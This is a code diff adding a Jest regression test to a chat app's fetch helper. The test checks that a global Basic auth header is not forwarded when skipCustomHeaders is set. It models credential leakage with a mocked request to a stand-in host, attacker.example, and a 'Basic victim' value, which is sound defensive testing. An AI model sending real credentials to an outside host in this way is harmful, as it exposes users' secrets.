@@ -1,3 +1,5 @@
+import { settings as RocketChatSettings } from '@rocket.chat/sdk';
+
 import fetchWithHeaders, { headers } from '../fetch';
 
 jest.mock('react-native-device-info', () => ({
@@ -34,5 +36,24 @@ describe('fetch helper', () => {
 		expect(fetchMock).toHaveBeenCalledWith('https://open.rocket.chat/api/info', {
 			headers: { 'X-Auth-Token': 'token', 'X-User-Id': 'userId', 'User-Agent': headers['User-Agent'] }
 		});
+	});
+
+	it('excludes global basic auth when skipCustomHeaders is true', async () => {
+		RocketChatSettings.customHeaders = { ...headers, Authorization: 'Basic victim' };
+
+		await fetchWithHeaders('https://attacker.example/api/info', {
+			headers: { 'Content-Type': 'application/json', Authorization: 'Basic requested' },
+			skipCustomHeaders: true
+		});
+
+		expect(fetchMock).toHaveBeenCalledWith('https://attacker.example/api/info', {
+			headers: {
+				'Content-Type': 'application/json',
+				Authorization: 'Basic requested',
+				'User-Agent': headers['User-Agent']
+			}
+		});
+
+		RocketChatSettings.customHeaders = headers;
 	});
 });
